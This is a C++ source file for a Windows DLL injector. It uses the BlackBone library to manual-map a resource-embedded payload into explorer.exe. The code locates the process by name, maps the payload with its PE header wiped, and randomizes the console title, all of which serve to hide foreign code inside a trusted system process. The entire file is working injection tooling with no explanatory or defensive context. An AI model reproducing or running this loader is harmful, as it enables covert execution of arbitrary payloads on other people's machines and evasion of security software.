//=====================================================================================

#include <Blackbone/src/BlackBone/Process/Process.h>
#include <Blackbone/src/BlackBone/Misc/Utils.h>

#include "StdAfx.hpp"
#include "Message.hpp"
#include "Resource.h"

//=====================================================================================

#define TARGET_PROCESS "explorer.exe"

//=====================================================================================

using namespace std;
using namespace blackbone;

Process _process;
NTSTATUS _lastStatus;

bool Inject()
{
	HRSRC hResource = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_PAYLOAD), "PAYLOAD");
	DWORD dwPayloadSize = SizeofResource(GetModuleHandle(NULL), hResource);
	LPVOID pPayloadData = VirtualAlloc(NULL, dwPayloadSize, MEM_COMMIT, PAGE_READWRITE);

	CopyMemory(pPayloadData, LockResource(LoadResource(GetModuleHandle(NULL), hResource)), dwPayloadSize);

	return _process.mmap().MapImage(dwPayloadSize, pPayloadData, false, WipeHeader).status;
}

//=====================================================================================

DWORD EnumProcess(string name)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	PROCESSENTRY32 ProcessEntry = { NULL };
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);

	for (BOOL bSuccess = Process32First(hSnapshot, &ProcessEntry); bSuccess; bSuccess = Process32Next(hSnapshot, &ProcessEntry))
	{
		if (!strcmp(ProcessEntry.szExeFile, name.c_str()))
			return ProcessEntry.th32ProcessID;
	}

	return NULL;
}

//=====================================================================================

int main()
{
	SetConsoleTitleW(Utils::RandomANString().c_str());

	cout << "TargetProcess: " << TARGET_PROCESS << endl;

	_lastStatus = _process.Attach(EnumProcess(TARGET_PROCESS));

	if (!NT_SUCCESS(_lastStatus))
	{
		cout << "Error: Process not found" << endl;
		system("pause");
		return _lastStatus;
	}

	cout << "Got process ID: 0x" << hex << _process.pid() << endl;

	_lastStatus = Inject();

	if (!NT_SUCCESS(_lastStatus))
	{
		cout << "Error: Injection failed" << endl;
		system("pause");
		return _lastStatus;
	}

	cout << "Injected" << endl;
	return _lastStatus;
}

//=====================================================================================